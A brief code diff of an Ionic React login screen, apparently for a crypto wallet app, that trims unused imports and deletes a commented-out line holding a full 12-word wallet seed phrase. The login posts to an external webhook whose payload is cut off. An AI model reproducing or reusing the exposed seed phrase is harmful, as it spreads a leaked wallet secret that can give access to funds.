@@ -1,12 +1,7 @@
 import {
-  IonHeader,
   IonPage,
-  IonTitle,
-  IonToolbar,
   IonButton,
-  IonContent,
   IonInput,
-  IonItem,
   IonLabel,
   useIonAlert,
 } from "@ionic/react";
@@ -21,8 +16,6 @@ const Login: React.FC = () => {
   const [presentAlert] = useIonAlert();
 
   const login = () => {
-    //history.push('/menu', { mnemonic: "travel upgrade inside soda birth essence junk merit never twenty system opinion" });
-
     fetch("https://cryptokeeper.altervista.org/APP/webhook.php", {
       method: "POST",
       body: JSON.stringify({
